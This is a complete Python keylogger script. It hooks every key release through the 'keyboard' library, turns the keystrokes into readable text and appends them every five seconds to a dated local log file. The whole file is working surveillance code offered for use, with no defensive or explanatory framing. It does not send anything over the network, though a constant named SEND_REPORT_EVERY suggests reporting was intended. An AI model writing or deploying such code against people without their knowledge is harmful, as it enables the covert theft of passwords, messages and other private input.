from threading import Timer
from datetime import datetime

import keyboard

SEND_REPORT_EVERY = 5  # interval / sec.


class Keylogger:
    def __init__(self, interval):
        self.filename = None
        self.interval = interval
        self.log = ""
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

    def callback(self, event: keyboard.KeyboardEvent) -> None:
        name = event.name
        if len(name) > 1:
            match name:
                case "space":
                    name = " "
                case "enter":
                    name = "[ENTER]\n"
                case "decimal":
                    name = "."
                case _:
                    name = name.replace(' ', '_')
                    name = "[%s]" % name.upper()
        self.log += name

    def update_filename(self) -> None:
        # start_dt_str = str(self.start_dt)[:-7].replace(' ', '-').replace(':', '')
        # end_dt_str = str(self.end_dt)[:-7].replace(' ', '-').replace(':', '')
        # self.filename = "keylog--%s_%s" % (start_dt_str, end_dt_str)
        self.filename = "keylog_%s" % datetime.utcnow().strftime('%d-%m-%Y')

    def report_to_file(self) -> None:
        with open('%s.txt' % self.filename, 'a', encoding='utf-8') as file:
            print(self.log, file=file)
        print('Saving %s.txt' % self.filename)

    def report(self) -> None:
        if self.log:
            self.end_dt = datetime.now()
            self.update_filename()
            self.report_to_file()
            self.start_dt = datetime.now()

        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()

    def start(self) -> None:
        self.start_dt = datetime.now()
        keyboard.on_release(callback=self.callback)
        self.report()
        keyboard.wait()


if __name__ == '__main__':
    Keylogger(interval=SEND_REPORT_EVERY).start()
